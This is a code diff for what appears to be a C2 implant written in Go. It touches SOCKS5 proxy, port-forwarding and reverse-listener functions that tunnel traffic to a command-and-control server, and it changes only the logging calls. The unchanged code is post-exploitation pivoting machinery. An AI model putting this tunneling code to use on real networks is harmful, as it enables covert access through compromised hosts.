@@ -38,7 +38,7 @@ func Socks5Proxy(op string, addr string) (err error) {
 	// op
 	switch op {
 	case "on":
-		logging.Printf("Starting Socks5Proxy %s", addr)
+		logging.Infof("Starting Socks5Proxy %s", addr)
 		def.ProxyDone = make(chan struct{})
 		go func() {
 			defer func() {
@@ -64,11 +64,11 @@ func Socks5Proxy(op string, addr string) (err error) {
 				def.ProxyLock.Unlock()
 			})
 			if err != nil {
-				logging.Printf("StartSock5Proxy %s: %v", addr, err)
+				logging.Infof("StartSock5Proxy %s: %v", addr, err)
 			}
 		}()
 	case "off":
-		logging.Printf("Stopping Socks5Proxy %s", addr)
+		logging.Infof("Stopping Socks5Proxy %s", addr)
 		if def.ProxyServer == nil {
 			return errors.New("proxy server is not running")
 		}
@@ -128,14 +128,14 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 	// connect via h2 to CC, or not
 	ctx, cancel = context.WithCancel(context.Background())
 	if reverse {
-		logging.Printf("PortFwd (reversed) started: %s (%s)", addr, sessionID)
+		logging.Infof("PortFwd (reversed) started: %s (%s)", addr, sessionID)
 		go listenAndFwd(ctx, cancel, addr, sessionID) // here addr is a port number to listen on
 	} else {
 		conn, ctx, cancel, err = c2transport.EstablishC2Connection(url)
 		if err != nil {
 			return fmt.Errorf("failed to connect to CC: %v", err)
 		}
-		logging.Printf("PortFwd (%s) started: %s (%s)", protocol, addr, sessionID)
+		logging.Infof("PortFwd (%s) started: %s (%s)", protocol, addr, sessionID)
 		go transport.FwdToDport(ctx, cancel, addr, sessionID, protocol, conn, timeout)
 	}
 
@@ -147,7 +147,7 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 		}
 
 		PortFwds.Delete(sessionID)
-		logging.Printf("PortFwd stopped: %s (%s)", addr, sessionID)
+		logging.Infof("PortFwd stopped: %s (%s)", addr, sessionID)
 	}()
 
 	// save this session
@@ -178,14 +178,14 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 		shID := fmt.Sprintf("%s_%s-reverse", sessionID, lport)
 		url, urlErr := BuildPortFwdURL(shID)
 		if urlErr != nil {
-			logging.Printf("BuildPortFwdURL (%s) failed: %v", shID, urlErr)
+			logging.Infof("BuildPortFwdURL (%s) failed: %v", shID, urlErr)
 			return
 		}
 
 		// start a h2 connection per incoming TCP connection
 		h2, _, h2cancel, err := c2transport.EstablishC2Connection(url)
 		if err != nil {
-			logging.Printf("h2conn (%s) failed: %v", url, err)
+			logging.Infof("h2conn (%s) failed: %v", url, err)
 			return
 		}
 		defer func() {
@@ -200,13 +200,13 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 		go func() {
 			_, err = io.Copy(conn, h2)
 			if err != nil {
-				logging.Printf("h2 -> conn: %v", err)
+				logging.Infof("h2 -> conn: %v", err)
 			}
 		}()
 		go func() {
 			_, err = io.Copy(h2, conn)
 			if err != nil {
-				logging.Printf("conn -> h2: %v", err)
+				logging.Infof("conn -> h2: %v", err)
 			}
 		}()
 
@@ -219,7 +219,7 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 	addr := "0.0.0.0:" + port
 	l, err := net.Listen("tcp", addr)
 	if err != nil {
-		logging.Printf("listen on %s failed: %s", addr, err)
+		logging.Infof("listen on %s failed: %s", addr, err)
 		cancel()
 	}
 	defer func() {
@@ -233,7 +233,7 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 	for ctx.Err() == nil {
 		conn, err := l.Accept()
 		if err != nil {
-			logging.Printf("Listening on 0.0.0.0:%s: %v", port, err)
+			logging.Infof("Listening on 0.0.0.0:%s: %v", port, err)
 			continue
 		}
 		go serveConn(conn)
